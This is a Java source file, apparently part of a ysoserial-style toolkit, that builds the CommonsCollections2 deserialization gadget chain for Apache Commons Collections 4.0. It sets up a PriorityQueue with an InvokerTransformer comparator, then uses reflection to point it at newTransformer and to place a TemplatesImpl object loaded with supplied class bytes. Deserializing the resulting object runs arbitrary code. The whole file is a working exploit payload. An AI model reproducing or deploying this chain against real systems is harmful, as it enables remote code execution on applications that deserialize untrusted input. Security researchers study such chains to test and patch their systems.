package com.threed.payloads;

import java.util.PriorityQueue;
import java.util.Queue;

import com.threed.utils.utils;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

//collections4.0
public class CommonsCollections2 implements ObjectPayload{

	@Override
	public Queue<Object> getObject(byte[] classBytes) throws Exception {
		final Object templates = utils.createTemplatesImpl(classBytes);
		// mock method name until armed
		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

		// create queue with numbers and basic comparator
		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
		// stub data for replacement later
		queue.add(1);
		queue.add(1);

		// switch method called by comparator
		utils.setFieldValue(transformer, "iMethodName", "newTransformer");

		// switch contents of queue
		final Object[] queueArray = (Object[]) utils.getFieldValue(queue, "queue");
		queueArray[0] = templates;
		queueArray[1] = 1;

		return queue;
	}

}
